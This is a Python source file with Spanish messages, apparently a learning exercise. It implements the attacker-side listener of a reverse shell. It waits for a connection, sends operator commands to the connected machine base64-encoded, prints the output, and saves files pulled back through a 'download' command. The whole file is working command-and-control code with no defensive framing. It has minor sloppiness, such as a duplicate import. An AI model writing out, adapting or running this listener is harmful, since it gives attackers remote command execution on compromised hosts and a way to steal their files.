import threading
import socket
import json
import base64
import os
import base64
class Listener:
    def __init__(self, ip, port):
        download_path = os.getcwd()
        listener = socket. socket(socket.AF_INET, socket. SOCK_STREAM)
        # listener. setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener. listen()
        print("[+] Esperando por conexiones")
        self.connection, address = listener.accept()
        # self.connection.setblocking(False)
        print("[+] Tenemos una conexion de" + str(address))


    def start_new_thread(self,f, args):
        threading.Thread(target=f, args=args).start()


    def reliable_send(self,data):
        json_data = ""
        json_data = base64.b64encode(data.encode())
        #json_data = base64.b64encode(bytes(data))
        self.connection.send(json_data)

    def reliable_recive(self):
        json_data = self.connection.recv(32768).decode()
        json_data = base64.b64decode(json_data)   
        return json_data.decode()


    def ejecutar_remoto(self, command):
        self.reliable_send(command)
        return self.reliable_recive()


    def write_file(self,path,content):
        with open(path, "w") as file:
            file.write(content)
        return "[+] descarga completada"


    def run (self):
        while True:
            try:
                command = input(">> ")
                result = self.ejecutar_remoto(command)

                if "download" in command:
                    command = command.split(" ")
                    self.write_file(command[1], result)
                print(result)
            except ValueError:
                continue


escuchar = Listener("localhost", 8080)
escuchar.run()